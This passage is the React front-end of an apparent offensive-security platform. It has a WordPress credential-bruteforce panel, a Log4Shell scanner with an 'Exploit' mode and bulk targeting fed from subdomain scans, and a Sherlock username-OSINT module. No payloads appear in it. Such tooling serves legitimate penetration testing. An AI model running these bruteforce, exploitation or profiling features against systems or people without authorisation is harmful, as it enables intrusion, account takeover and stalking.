                className={`w-full flex items-center justify-center gap-2 py-2.5 rounded-lg font-mono text-sm font-bold transition-all disabled:opacity-50 ${
                  bfRunning
                    ? 'bg-severity-critical bg-opacity-20 border border-severity-critical text-severity-critical'
                    : 'bg-severity-high bg-opacity-20 border border-severity-high text-severity-high hover:bg-opacity-30'
                }`}>
                {bfRunning
                  ? <><RefreshCw size={13} className="animate-spin" /> Bruteforcing...</>
                  : <>⚔ Start Bruteforce</>
                }
              </button>
            </div>

            {/* BF Terminal */}
            <div className="card p-3 font-mono text-xs h-36 overflow-y-auto bg-bg-tertiary">
              {bfLog.length === 0
                ? <p className="text-text-muted opacity-50">$ awaiting bruteforce...</p>
                : bfLog.map((l, i) => (
                  <p key={i} className={
                    l.startsWith('[+]') || l.startsWith('  ✓') ? 'text-severity-low' :
                    l.startsWith('[!]') ? 'text-severity-critical' :
                    l.startsWith('[-]') ? 'text-text-muted' :
                    'text-text-primary'
                  }>{l}</p>
                ))
              }
            </div>

            {/* Results */}
            {bfResults.length > 0 && (
              <div className="card p-4 border-severity-low space-y-3">
                <p className="text-xs font-mono font-bold text-severity-low">
                  🎯 {bfResults.length} Credential(s) Found!
                </p>
                {bfResults.map((r, i) => (
                  <div key={i} className="flex items-center gap-3 p-3 rounded-lg bg-bg-tertiary font-mono">
                    <div className="flex-1">
                      <p className="text-sm text-severity-low font-bold">{r.username}</p>
                      <p className="text-xs text-text-muted mt-0.5">Password: <span className="text-text-primary">{r.password}</span></p>
                    </div>
                    <button
                      onClick={() => navigator.clipboard.writeText(`${r.username}:${r.password}`)}
                      className="text-xs font-mono text-text-muted hover:text-accent-primary transition-colors px-2 py-1 border border-border-default rounded">
                      Copy
                    </button>
                  </div>
                ))}
              </div>
            )}

            {bfError && (
              <div className="card p-3 border-severity-critical">
                <p className="text-xs font-mono text-severity-critical">[!] {bfError}</p>
              </div>
            )}
          </div>
        )}

        {activeTab === 'scan' && <>
        {/* Terminal log */}
        <div className="card p-3 font-mono text-xs h-36 overflow-y-auto bg-bg-tertiary flex-shrink-0">
          {log.length === 0
            ? <p className="text-text-muted opacity-50">$ awaiting target...</p>
            : log.map((l, i) => (
              <p key={i} className={
                l.startsWith('[+]') ? 'text-severity-low' :
                l.startsWith('[!]') ? 'text-severity-high' :
                l.startsWith('[-]') ? 'text-text-muted' :
                l.startsWith('  [CRITICAL]') ? 'text-severity-critical' :
                l.startsWith('  [HIGH]') ? 'text-severity-high' :
                'text-text-primary'
              }>{l}</p>
            ))
          }
        </div>

        {/* Result */}
        {result && !result.is_wordpress && (
          <div className="card p-4 flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-bg-tertiary flex items-center justify-center flex-shrink-0">
              <Globe size={20} className="text-text-muted" />
            </div>
            <div>
              <p className="text-sm font-mono font-bold text-text-primary">Not a WordPress Site</p>
              <p className="text-xs font-mono text-text-muted mt-0.5">
                No WordPress indicators detected at {target}
              </p>
            </div>
          </div>
        )}

        {result?.is_wordpress && (
          <div className="flex-1 min-h-0 overflow-y-auto space-y-3">
            {/* Summary cards */}
            <div className="grid grid-cols-5 gap-2">
              {(['critical','high','medium','low','info'] as const).map(sev => (
                <div key={sev} className="card p-3 text-center"
                  style={{ borderColor: (result.summary?.[sev] || 0) > 0 ? SEV_COLOR[sev] + '60' : undefined }}>
                  <p className="text-lg font-mono font-bold" style={{ color: SEV_COLOR[sev] }}>
                    {result.summary?.[sev] || 0}
                  </p>
                  <p className="text-xs font-mono text-text-muted capitalize">{sev}</p>
                </div>
              ))}
            </div>

            {/* Findings */}
            {result.findings?.map((f: any, i: number) => (
              <div key={i} className="card p-3 space-y-2"
                style={{ borderLeft: `3px solid ${SEV_COLOR[f.severity] || '#74c7ec'}` }}>
                <div className="flex items-start justify-between gap-2">
                  <div className="flex items-center gap-2">
                    <span className="text-xs font-mono px-1.5 py-0.5 rounded font-bold"
                      style={{ background: SEV_COLOR[f.severity] + '20', color: SEV_COLOR[f.severity] }}>
                      {f.severity.toUpperCase()}
                    </span>
                    <p className="text-sm font-mono font-bold text-text-primary">{f.title}</p>
                  </div>
                  <span className="text-xs font-mono text-text-muted capitalize flex-shrink-0">{f.type}</span>
                </div>
                {f.detail && (
                  <p className="text-xs font-mono text-text-muted">{f.detail}</p>
                )}
                {f.vulnerabilities?.length > 0 && (
                  <div className="space-y-1 pt-1 border-t border-border-default">
                    {f.vulnerabilities.map((v: any, j: number) => (
                      <div key={j} className="flex items-start gap-2">
                        <AlertTriangle size={10} className="text-severity-high flex-shrink-0 mt-0.5" />
                        <p className="text-xs font-mono text-severity-high">{v.title}</p>
                        {v.cvss?.score && (
                          <span className="text-xs font-mono text-text-muted ml-auto flex-shrink-0">
                            CVSS {v.cvss.score}
                          </span>
                        )}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            ))}
          </div>
        )}

        {error && (
          <div className="card p-3 border-severity-critical">
            <p className="text-xs font-mono text-severity-critical">[!] {error}</p>
          </div>
        )}
        </>}
      </div>
    </div>
  )
}


// ── Log4Shell Module ──────────────────────────────────────────
function Log4ShellModule() {
  const [targets, setTargets] = useState('')
  const [mode, setMode] = useState<'detect'|'exploit'>('detect')
  const [customCallback, setCustomCallback] = useState('')
  const [scanning, setScanning] = useState(false)
  const [results, setResults] = useState<any[]>([])
  const [summary, setSummary] = useState<any>(null)
  const [log, setLog] = useState<string[]>([])
  const [activeTab, setActiveTab] = useState<'scan'|'results'|'bulk'>('scan')
  const [bulkTargets, setBulkTargets] = useState<string[]>([])
  const [selectedBulk, setSelectedBulk] = useState<string[]>([])
  const abortRef = useRef<AbortController|null>(null)
  const addLog = (msg: string) => setLog(prev => [...prev, msg])

  // Listen for subdomains from React2Shell via localStorage event
  useEffect(() => {
    const handler = (e: StorageEvent) => {
      if (e.key === 'log4shell_targets' && e.newValue) {
        try {
          const t = JSON.parse(e.newValue)
          setBulkTargets(t)
          setActiveTab('bulk')
          addLog(`[+] Received ${t.length} targets from subdomain scan`)
        } catch {}
      }
    }
    window.addEventListener('storage', handler)
    // Also check on mount
    const stored = localStorage.getItem('log4shell_targets')
    if (stored) {
      try { setBulkTargets(JSON.parse(stored)) } catch {}
    }
    return () => window.removeEventListener('storage', handler)
  }, [])

  const runScan = async (targetList?: string[]) => {
    const rawTargets = targetList || targets.split('\n').map(t => t.trim()).filter(Boolean)
    if (!rawTargets.length) return

    setScanning(true)
    setResults([])
    setSummary(null)
    setLog([])
    setActiveTab('scan')
    const controller = new AbortController()
    abortRef.current = controller

    addLog(`[*] Log4Shell Scanner — CVE-2021-44228`)
    addLog(`[*] Mode: ${mode}`)
    addLog(`[*] Targets: ${rawTargets.length}`)
    addLog(`[*] OAST callback: ${customCallback || 'oast.pro (default)'}`)
    addLog(`[*] Starting scan...`)
    rawTargets.forEach(t => addLog(`  → ${t}`))

    try {
      const res = await api.post('/scan-engine/log4shell/scan', {
        targets: rawTargets,
        mode,
        custom_callback: customCallback.trim(),
        headers_to_test: [],
      }, { signal: controller.signal, timeout: 300000 })

      const d = res.data
      setSummary(d.summary)
      setResults(d.results || [])

      addLog(`\n[+] Scan complete — ID: ${d.scan_id}`)
      addLog(`[+] Total: ${d.summary?.total} | Vulnerable: ${d.summary?.vulnerable} | Clean: ${d.summary?.not_vulnerable}`)

      d.results?.forEach((r: any) => {
        const icon = r.vulnerable ? '[VULN]' : '[SAFE]'
        addLog(`  ${icon} ${r.target} — ${r.findings?.length || 0} findings`)
        r.findings?.forEach((f: any) => addLog(`    ↳ [${f.severity.toUpperCase()}] ${f.title}`))
      })

      if (d.summary?.vulnerable > 0) {
        addLog(`\n[!] ${d.summary.vulnerable} VULNERABLE TARGET(S) FOUND!`)
      } else {
        addLog(`\n[-] No Log4Shell vulnerabilities detected`)
      }
    } catch(e: any) {
      if (e?.code === 'ERR_CANCELED') { addLog('[!] Cancelled'); return }
      addLog(`[!] Error: ${e.response?.data?.detail || e.message}`)
    } finally {
      setScanning(false)
      abortRef.current = null
    }
  }

  const SEV_COLOR: Record<string,string> = {
    critical:'#ff5f5f', high:'#ff9f43', medium:'#ffd43b', low:'#a9e34b', info:'#74c7ec'
  }

  const HEADERS_DEFAULT = [
    'User-Agent','X-Forwarded-For','X-Api-Version','X-Forwarded-Host',
    'Referer','X-Client-IP','CF-Connecting-IP','True-Client-IP',
  ]

  return (
    <div className="h-full flex gap-4 min-h-0">
      {/* Left panel */}
      <div className="w-80 flex-shrink-0 flex flex-col gap-3 overflow-y-auto">
        {/* CVE badge */}
        <div className="card p-3 border-severity-critical">
          <div className="flex items-center gap-2 mb-1">
            <span className="text-xs font-mono font-bold text-severity-critical px-2 py-0.5 rounded bg-severity-critical bg-opacity-20">
              CVE-2021-44228
            </span>
            <span className="text-xs font-mono text-severity-critical font-bold">CRITICAL 10.0</span>
          </div>
          <p className="text-xs font-mono text-text-muted">
            Apache Log4j2 JNDI injection RCE. Affects Log4j 2.0-beta9 to 2.14.1.
          </p>
        </div>

        {/* Targets */}
        <div className="card p-4 space-y-3">
          <p className="text-xs font-mono font-bold text-accent-primary flex items-center gap-2">
            <Target size={12} /> Targets
          </p>
          <div>
            <label className="text-xs font-mono text-text-muted mb-1 block">
              URLs / IPs <span className="opacity-60">(one per line)</span>
            </label>
            <textarea
              value={targets}
              onChange={e => setTargets(e.target.value)}
              rows={4}
              placeholder={"https://target.com\nhttp://192.168.1.1:8080\nhttps://app.example.com"}
              disabled={scanning}
              className="input-field font-mono text-xs w-full resize-none"
            />
            <p className="text-xs font-mono text-text-muted opacity-60 mt-1">
              {targets.split('\n').filter(t=>t.trim()).length} target(s)
            </p>
          </div>

          {/* Mode */}
          <div>
            <label className="text-xs font-mono text-text-muted mb-1 block">Mode</label>
            <div className="grid grid-cols-2 gap-1">
              {([
                { id: 'detect',  label: '🔍 Detect',  desc: 'Safe — check only' },
                { id: 'exploit', label: '⚡ Exploit', desc: 'Active exploitation' },
              ] as const).map(m => (
                <button key={m.id} onClick={() => setMode(m.id)} disabled={scanning}
                  className={`p-2 rounded-lg border text-left transition-all ${
                    mode === m.id
                      ? m.id === 'exploit'
                        ? 'border-severity-critical bg-severity-critical bg-opacity-10'
                        : 'border-accent-primary bg-accent-primary bg-opacity-10'
                      : 'border-border-default hover:border-border-muted'
                  }`}>
                  <p className={`text-xs font-mono font-bold ${
                    mode === m.id
                      ? m.id === 'exploit' ? 'text-severity-critical' : 'text-accent-primary'
                      : 'text-text-primary'
                  }`}>{m.label}</p>
                  <p className="text-xs font-mono text-text-muted opacity-70">{m.desc}</p>
                </button>
              ))}
            </div>
          </div>

          {/* Custom OAST */}
          <div>
            <label className="text-xs font-mono text-text-muted mb-1 block">
              Custom OAST Callback <span className="opacity-60">(optional)</span>
            </label>
            <input
              value={customCallback}
              onChange={e => setCustomCallback(e.target.value)}
              placeholder="your.interactsh.server"
              disabled={scanning}
              className="input-field font-mono text-xs"
            />
            <p className="text-xs font-mono text-text-muted opacity-60 mt-1">
              Leave empty to use oast.pro
            </p>
          </div>

          {/* Scan button */}
          <button
            onClick={() => {
              if (scanning) {
                evtRef.current?.close()
                evtRef.current = null
                setScanning(false)
                addLog('[!] Scan cancelled by user')
              } else {
                runScan()
              }
            }}
            disabled={!targets.trim() && !scanning}
            className={`w-full flex items-center justify-center gap-2 py-2.5 rounded-lg font-mono text-sm font-bold transition-all disabled:opacity-50 ${
              scanning
                ? 'bg-severity-critical bg-opacity-20 border border-severity-critical text-severity-critical'
                : mode === 'exploit'
                  ? 'bg-severity-critical bg-opacity-20 border border-severity-critical text-severity-critical hover:bg-opacity-30'
                  : 'btn-primary'
            }`}>
            {scanning
              ? <><X size={13} /> Cancel</>
              : mode === 'exploit'
                ? <><Zap size={13} /> Exploit Log4Shell</>
                : <><Search size={13} /> Detect Log4Shell</>
            }
          </button>
        </div>

        {/* Headers tested */}
        <div className="card p-3 space-y-2">
          <p className="text-xs font-mono font-bold text-text-muted">Headers Tested</p>
          {HEADERS_DEFAULT.map(h => (
            <div key={h} className="flex items-center gap-2">
              <div className="w-1.5 h-1.5 rounded-full bg-accent-primary flex-shrink-0" />
              <p className="text-xs font-mono text-text-muted">{h}</p>
            </div>
          ))}
        </div>
      </div>

      {/* Right panel */}
      <div className="flex-1 min-h-0 flex flex-col gap-3">
        {/* Tabs */}
        <div className="flex gap-1 flex-shrink-0">
          {([
            { id: 'scan',    label: 'Scan Log' },
            { id: 'results', label: `Results${results.length ? ` (${results.length})` : ''}` },
            { id: 'bulk',    label: `Bulk${bulkTargets.length ? ` (${bulkTargets.length})` : ''}` },
          ] as const).map(t => (
            <button key={t.id} onClick={() => setActiveTab(t.id)}
              className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                activeTab === t.id
                  ? 'bg-accent-primary bg-opacity-20 text-accent-primary border border-accent-primary border-opacity-40'
                  : 'text-text-muted hover:text-text-primary border border-transparent'
              }`}>{t.label}</button>
          ))}
        </div>

        {/* Scan log */}
        {activeTab === 'scan' && (
          <div className="flex-1 min-h-0 overflow-y-auto card p-3 font-mono text-xs bg-bg-tertiary">
            {log.length === 0
              ? <p className="text-text-muted opacity-50">$ awaiting targets...</p>
              : log.map((l,i) => (
                <p key={i} className={
                  l.includes('[VULN]') ? 'text-severity-critical font-bold' :
                  l.includes('[SAFE]') ? 'text-severity-low' :
                  l.startsWith('[+]') ? 'text-severity-low' :
                  l.startsWith('[!]') ? 'text-severity-critical' :
                  l.startsWith('[-]') ? 'text-text-muted' :
                  l.startsWith('  ↳') ? 'text-severity-high ml-2' :
                  'text-text-primary'
                }>{l}</p>
              ))
            }
          </div>
        )}

        {/* Results tab */}
        {activeTab === 'results' && (
          <div className="flex-1 min-h-0 overflow-y-auto space-y-3">
            {/* Summary */}
            {summary && (
              <div className="grid grid-cols-4 gap-2">
                {[
                  { label: 'Total',      val: summary.total,          color: '#74c7ec' },
                  { label: 'Vulnerable', val: summary.vulnerable,     color: '#ff5f5f' },
                  { label: 'Clean',      val: summary.not_vulnerable, color: '#a9e34b' },
                  { label: 'Errors',     val: summary.errors,         color: '#ffd43b' },
                ].map(s => (
                  <div key={s.label} className="card p-3 text-center">
                    <p className="text-lg font-mono font-bold" style={{color:s.color}}>{s.val}</p>
                    <p className="text-xs font-mono text-text-muted">{s.label}</p>
                  </div>
                ))}
              </div>
            )}

            {results.length === 0 && (
              <div className="card p-6 text-center">
                <p className="text-text-muted font-mono text-xs">No results yet — run a scan first</p>
              </div>
            )}

            {results.map((r,i) => (
              <div key={i} className={`card p-4 space-y-3 ${r.vulnerable ? 'border-severity-critical' : ''}`}
                style={r.vulnerable ? {borderColor:'#ff5f5f60'} : {}}>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <span className={`text-xs font-mono font-bold px-2 py-0.5 rounded ${
                      r.vulnerable
                        ? 'bg-severity-critical bg-opacity-20 text-severity-critical'
                        : 'bg-severity-low bg-opacity-20 text-severity-low'
                    }`}>
                      {r.vulnerable ? '⚠ VULNERABLE' : '✓ SAFE'}
                    </span>
                    <p className="text-sm font-mono font-bold text-text-primary truncate">{r.target}</p>
                  </div>
                  <span className="text-xs font-mono text-text-muted flex-shrink-0">{r.status}</span>
                </div>

                {/* Payload used */}
                {r.payload_used && (
                  <div className="p-2 rounded bg-bg-tertiary">
                    <p className="text-xs font-mono text-text-muted mb-1">Payload:</p>
                    <p className="text-xs font-mono text-severity-high break-all">{r.payload_used}</p>
                  </div>
                )}

                {/* Headers tested */}
                {r.headers_tested?.length > 0 && (
                  <div className="flex flex-wrap gap-1">
                    {r.headers_tested.map((h:string) => (
                      <span key={h} className="text-xs font-mono px-1.5 py-0.5 rounded bg-bg-tertiary text-text-muted">{h}</span>
                    ))}
                  </div>
                )}

                {/* Findings */}
                {r.findings?.length > 0 && (
                  <div className="space-y-2 pt-2 border-t border-border-default">
                    {r.findings.map((f:any,j:number) => (
                      <div key={j} className="p-2 rounded-lg bg-bg-tertiary space-y-1">
                        <div className="flex items-center gap-2">
                          <span className="text-xs font-mono font-bold px-1.5 py-0.5 rounded"
                            style={{background:SEV_COLOR[f.severity]+'20',color:SEV_COLOR[f.severity]}}>
                            {f.severity.toUpperCase()}
                          </span>
                          <p className="text-xs font-mono font-bold text-text-primary">{f.title}</p>
                          {f.cve && (
                            <span className="text-xs font-mono text-severity-critical ml-auto">{f.cve}</span>
                          )}
                        </div>
                        {f.matched && f.matched !== r.target && (
                          <p className="text-xs font-mono text-text-muted truncate">↳ {f.matched}</p>
                        )}
                        {f.header && (
                          <p className="text-xs font-mono text-severity-high">Header: {f.header}</p>
                        )}
                        {f.payload && (
                          <p className="text-xs font-mono text-text-muted break-all">{f.payload}</p>
                        )}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            ))}
          </div>
        )}

        {/* Bulk tab */}
        {activeTab === 'bulk' && (
          <div className="flex-1 min-h-0 overflow-y-auto space-y-3">
            <div className="card p-3 flex items-center justify-between">
              <p className="text-xs font-mono text-text-muted">
                {bulkTargets.length > 0
                  ? `${bulkTargets.length} targets from subdomain scan`
                  : 'No bulk targets — run subdomain scan in React2Shell first'
                }
              </p>
              {bulkTargets.length > 0 && (
                <div className="flex gap-2">
                  <button
                    onClick={() => setSelectedBulk(
                      selectedBulk.length === bulkTargets.length ? [] : [...bulkTargets]
                    )}
                    className="text-xs font-mono text-text-muted hover:text-accent-primary transition-colors">
                    {selectedBulk.length === bulkTargets.length ? 'Deselect all' : 'Select all'}
                  </button>
                  <button
                    onClick={() => {
                      if (selectedBulk.length === 0) return
                      runScan(selectedBulk)
                    }}
                    disabled={selectedBulk.length === 0 || scanning}
                    className="px-3 py-1 rounded-lg text-xs font-mono font-bold btn-primary disabled:opacity-50">
                    Scan {selectedBulk.length > 0 ? `(${selectedBulk.length})` : ''}
                  </button>
                </div>
              )}
            </div>

            {bulkTargets.map((t,i) => (
              <div key={i}
                onClick={() => setSelectedBulk(prev =>
                  prev.includes(t) ? prev.filter(x=>x!==t) : [...prev,t]
                )}
                className={`card p-3 cursor-pointer transition-all flex items-center gap-3 ${
                  selectedBulk.includes(t)
                    ? 'border-accent-primary bg-accent-primary bg-opacity-5'
                    : 'hover:border-border-muted'
                }`}>
                <div className={`w-4 h-4 rounded border flex-shrink-0 flex items-center justify-center transition-all ${
                  selectedBulk.includes(t)
                    ? 'bg-accent-primary border-accent-primary'
                    : 'border-border-muted'
                }`}>
                  {selectedBulk.includes(t) && <CheckCircle size={10} className="text-bg-primary" />}
                </div>
                <p className="text-xs font-mono text-text-primary">{t}</p>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  )
}


// ── Sherlock OSINT Module ─────────────────────────────────────
const CATEGORY_META: Record<string, {color: string, icon: string}> = {
  'social':       { color: '#6366f1', icon: '👤' },
  'dev/security': { color: '#06b6d4', icon: '💻' },
  'gaming':       { color: '#a9e34b', icon: '🎮' },
  'music':        { color: '#ff9f43', icon: '🎵' },
  'creative':     { color: '#ff79c6', icon: '🎨' },
  'dating':       { color: '#ff5f5f', icon: '❤️' },
  'other':        { color: '#74c7ec', icon: '🌐' },
}

function SherlockModule() {
  const [usernames, setUsernames] = useState('')
  const [timeout, setTimeout2] = useState(60)
  const [nsfw, setNsfw] = useState(false)
  const [scanning, setScanning] = useState(false)
  const [results, setResults] = useState<Record<string, any[]>>({})
  const [summary, setSummary] = useState<Record<string, any>>({})
  const [totalFound, setTotalFound] = useState(0)
  const [log, setLog] = useState<string[]>([])
  const [activeTab, setActiveTab] = useState<'scan'|'results'|'history'>('scan')
  const [filterCat, setFilterCat] = useState<string>('all')
  const [searchSite, setSearchSite] = useState('')
  const [activeUser, setActiveUser] = useState<string>('')
  const abortRef = useRef<AbortController|null>(null)
  const evtRef = useRef<EventSource|null>(null)
  const [history, setHistory] = useState<{usernames: string[], total: number, results: Record<string,any[]>, date: string}[]>([])
  const [histTab, setHistTab] = useState<'scan'|'results'|'history'>('scan')
  const addLog = (m: string) => setLog(p => [...p, m])

  const runScan = async () => {
    const uList = usernames.split('\n').flatMap(u => u.split(',')).map(u => u.trim()).filter(Boolean)
    if (!uList.length) return

    setScanning(true)
    setResults({})
    setSummary({})
    setTotalFound(0)
    setLog([])
    setActiveTab('results')
    const controller = new AbortController()
    abortRef.current = controller

    addLog(`[*] Sherlock v0.16.0 — Username OSINT`)
    addLog(`[*] Usernames: ${uList.join(', ')}`)
    addLog(`[*] Timeout: ${timeout}s per site`)
    addLog(`[*] Scanning 400+ social networks...`)

    // Get token from zustand persisted store
    const authRaw = localStorage.getItem('offensecops-auth')
    const token = authRaw ? (JSON.parse(authRaw)?.state?.accessToken || '') : ''
    const params = new URLSearchParams({
      usernames: uList.join(','),
      timeout: String(timeout),
      nsfw: String(nsfw),
      token,
    })

    try {
      const evtSource = new EventSource(
        `/api/scan-engine/sherlock/stream?${params}`
      )
      evtRef.current = evtSource

      const localResults: Record<string, any[]> = {}
      let localTotal = 0
      let firstUser = ''

      evtSource.onmessage = (e) => {
        try {
          const msg = JSON.parse(e.data)

          if (msg.type === 'start') {
            msg.usernames.forEach((u: string) => { localResults[u] = [] })
            if (!firstUser) firstUser = msg.usernames[0]
            setActiveUser(firstUser)
          }

          else if (msg.type === 'checking') {
            addLog(`\n[*] Scanning: ${msg.username}`)
            setActiveUser(msg.username)
          }

          else if (msg.type === 'found') {
            const { username, site, url, category, count } = msg
            localResults[username] = [...(localResults[username] || []), { site, url, category }]
            localTotal++
            setResults({ ...localResults })
            setTotalFound(localTotal)
            addLog(`[+] ${site}: ${url}`)

            // Update summary
            setSummary(prev => {
              const u = prev[username] || { total: 0, categories: {} }
              const cats = { ...u.categories, [category]: (u.categories[category] || 0) + 1 }
              return { ...prev, [username]: { total: count, categories: cats } }
            })
          }

          else if (msg.type === 'complete') {
            addLog(`\n[+] Scan complete! Total: ${localTotal} accounts found`)
            Object.entries(msg.counts).forEach(([u, cnt]) =>
              addLog(`  → ${u}: ${cnt} accounts`)
            )
            evtSource.close()
            evtRef.current = null
            setScanning(false)
            // Save to history
            setHistory(prev => [{
              usernames: uList,
              total: localTotal,
              results: {...localResults},
              date: new Date().toLocaleString(),
            }, ...prev.slice(0, 19)])
          }

          else if (msg.type === 'error') {
            addLog(`[!] Error: ${msg.message}`)
            evtSource.close()
            evtRef.current = null
            setScanning(false)
          }
        } catch {}
      }

      evtSource.onerror = () => {
        evtSource.close()
        evtRef.current = null
        setScanning(false)
      }

    } catch(e: any) {
      addLog(`[!] Error: ${e.message}`)
      setScanning(false)
    }
  }

  const allFindings = activeUser && results[activeUser]
    ? results[activeUser].filter(f =>
        (filterCat === 'all' || f.category === filterCat) &&
        (!searchSite || f.site.toLowerCase().includes(searchSite.toLowerCase()))
      )
    : []

  const cats = activeUser && summary[activeUser]?.categories || {}

  return (
    <div className="h-full flex gap-4 min-h-0">
      {/* Left panel */}
      <div className="w-72 flex-shrink-0 flex flex-col gap-3 overflow-y-auto">
        <div className="card p-4 space-y-3">
          <p className="text-xs font-mono font-bold text-accent-primary flex items-center gap-2">
            🔍 Sherlock OSINT
          </p>

          <div>
            <label className="text-xs font-mono text-text-muted mb-1 block">
              Usernames <span className="opacity-60">(comma or newline)</span>
            </label>
            <textarea
              value={usernames}
              onChange={e => setUsernames(e.target.value)}
              rows={3}
              placeholder="johndoe, janedoe, alice"
              disabled={scanning}
              className="input-field font-mono text-xs w-full resize-none"
            />
            <p className="text-xs font-mono text-text-muted opacity-60 mt-1">
              {usernames.split('\n').flatMap(u => u.split(',')).filter(u=>u.trim()).length} username(s) · max 5
            </p>
          </div>

          {/* Timeout */}
          <div className="flex items-center gap-3">
            <label className="text-xs font-mono text-text-muted">Timeout:</label>
            {[15, 30, 60, 120].map(t => (
              <button key={t} onClick={() => setTimeout2(t)} disabled={scanning}
                className={`px-2 py-1 rounded text-xs font-mono transition-all ${
                  timeout === t
                    ? 'bg-accent-primary bg-opacity-20 text-accent-primary'
                    : 'text-text-muted hover:text-text-primary'
                }`}>{t}s</button>
            ))}
          </div>

          {/* NSFW toggle */}
          <label className="flex items-center gap-2 cursor-pointer">
            <div className="relative">
              <input type="checkbox" checked={nsfw} onChange={e => setNsfw(e.target.checked)}
                disabled={scanning} className="sr-only" />
              <div className={`w-8 h-4 rounded-full transition-all ${nsfw ? 'bg-accent-primary' : 'bg-border-muted'}`}>
                <div className={`w-3 h-3 rounded-full bg-white absolute top-0.5 transition-all ${nsfw ? 'left-4' : 'left-0.5'}`} />
              </div>
            </div>
            <span className="text-xs font-mono text-text-muted">Include NSFW sites</span>
          </label>

          <button
            onClick={() => {
              if (scanning) {
                evtRef.current?.close()
                evtRef.current = null
                setScanning(false)
                addLog('[!] Scan cancelled by user')
              } else {
                runScan()
              }
            }}
            disabled={!usernames.trim() && !scanning}
            className={`w-full flex items-center justify-center gap-2 py-2.5 rounded-lg font-mono text-sm font-bold transition-all disabled:opacity-50 ${
              scanning
                ? 'bg-severity-critical bg-opacity-20 border border-severity-critical text-severity-critical'
                : 'btn-primary'
            }`}>
            {scanning
              ? <><X size={13} /> Cancel</>
              : <>🔍 Hunt Username</>
            }
          </button>
        </div>

        {/* Category breakdown */}
        {Object.keys(results).length > 0 && (
          <div className="card p-3 space-y-2">
            <p className="text-xs font-mono font-bold text-text-muted mb-2">
              {activeUser} — {totalFound} accounts
            </p>
            {/* User tabs if multiple */}
            {Object.keys(results).length > 1 && (
              <div className="flex flex-wrap gap-1 mb-2">
                {Object.keys(results).map(u => (
                  <button key={u} onClick={() => setActiveUser(u)}
                    className={`px-2 py-1 rounded text-xs font-mono transition-all ${
                      activeUser === u
                        ? 'bg-accent-primary bg-opacity-20 text-accent-primary'
                        : 'text-text-muted hover:text-text-primary'
                    }`}>{u} ({results[u].length})</button>
                ))}
              </div>
            )}
            {/* Category filter */}
            <button onClick={() => setFilterCat('all')}
              className={`w-full text-left px-2 py-1.5 rounded text-xs font-mono transition-all ${
                filterCat === 'all' ? 'bg-accent-primary bg-opacity-10 text-accent-primary' : 'text-text-muted hover:text-text-primary'
              }`}>
              All ({results[activeUser]?.length || 0})
            </button>
            {Object.entries(cats).sort((a,b) => (b[1] as number)-(a[1] as number)).map(([cat, cnt]) => (
              <button key={cat} onClick={() => setFilterCat(cat)}
                className={`w-full text-left px-2 py-1.5 rounded text-xs font-mono transition-all flex items-center justify-between ${
                  filterCat === cat ? 'bg-accent-primary bg-opacity-10 text-accent-primary' : 'text-text-muted hover:text-text-primary'
                }`}>
                <span>{CATEGORY_META[cat]?.icon} {cat}</span>
                <span className="font-bold">{cnt as number}</span>
              </button>
            ))}
          </div>
        )}
      </div>

      {/* Right panel */}
      <div className="flex-1 min-h-0 flex flex-col gap-3">
        {/* Tabs */}
        <div className="flex gap-1 flex-shrink-0">
          {([
            { id: 'scan',    label: 'Scan Log' },
            { id: 'results', label: `Results${totalFound ? ` (${totalFound})` : ''}` },
            { id: 'history', label: `History (${history.length})` },
          ] as const).map(t => (
            <button key={t.id} onClick={() => setActiveTab(t.id)}
              className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                activeTab === t.id
                  ? 'bg-accent-primary bg-opacity-20 text-accent-primary border border-accent-primary border-opacity-40'
                  : 'text-text-muted hover:text-text-primary border border-transparent'
              }`}>{t.label}</button>
          ))}
        </div>

        {/* Scan log */}
        {activeTab === 'scan' && (
          <div className="flex-1 min-h-0 overflow-y-auto card p-3 font-mono text-xs bg-bg-tertiary">
            {log.length === 0
              ? <p className="text-text-muted opacity-50">$ sherlock --print-found --no-color ...</p>
              : log.map((l,i) => (
                <p key={i} className={
                  l.startsWith('[+]') ? 'text-severity-low' :
                  l.startsWith('[!]') ? 'text-severity-critical' :
                  l.startsWith('    ') ? 'text-text-muted ml-4' :
                  'text-text-primary'
                }>{l}</p>
              ))
            }
          </div>
        )}

        {/* History */}
        {activeTab === 'history' && (
          <div className="flex-1 min-h-0 overflow-y-auto space-y-2">
            {history.length === 0 ? (
              <div className="card p-6 text-center">
                <p className="text-text-muted font-mono text-xs">No scan history yet</p>
              </div>
            ) : history.map((h, i) => (
              <div key={i} className="card p-3 space-y-2 cursor-pointer hover:border-border-muted transition-all"
                onClick={() => {
                  setResults(h.results)
                  setTotalFound(h.total)
                  setActiveUser(h.usernames[0])
                  setActiveTab('results')
                }}>
                <div className="flex items-center justify-between">
                  <p className="text-xs font-mono font-bold text-text-primary">
                    {h.usernames.join(', ')}
                  </p>
                  <p className="text-xs font-mono text-text-muted">{h.date}</p>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-xs font-mono text-severity-low font-bold">{h.total} accounts</span>
                  <span className="text-xs font-mono text-text-muted">across {h.usernames.length} username(s)</span>
                </div>
              </div>
            ))}
          </div>
        )}

        {/* Results */}
        {activeTab === 'results' && (
          <div className="flex-1 min-h-0 flex flex-col gap-2">
            {/* Search */}
            <input
              value={searchSite}
              onChange={e => setSearchSite(e.target.value)}
              placeholder="Search site..."
              className="input-field font-mono text-xs flex-shrink-0"
            />

            <div className="flex-1 min-h-0 overflow-y-auto space-y-1">
              {allFindings.length === 0 ? (
                <div className="card p-6 text-center">
                  <p className="text-text-muted font-mono text-xs">
                    {totalFound === 0 ? 'No results — run a scan first' : 'No matches for filter'}
                  </p>
                </div>
              ) : allFindings.map((f, i) => (
                <a key={i} href={f.url} target="_blank" rel="noopener noreferrer"
                  className="card p-2.5 flex items-center gap-3 hover:border-border-muted transition-all cursor-pointer group">
                  <span className="text-base flex-shrink-0">{CATEGORY_META[f.category]?.icon || '🌐'}</span>
                  <div className="flex-1 min-w-0">
                    <p className="text-xs font-mono font-bold text-text-primary group-hover:text-accent-primary transition-colors">
                      {f.site}
                    </p>
                    <p className="text-xs font-mono text-text-muted truncate">{f.url}</p>
                  </div>
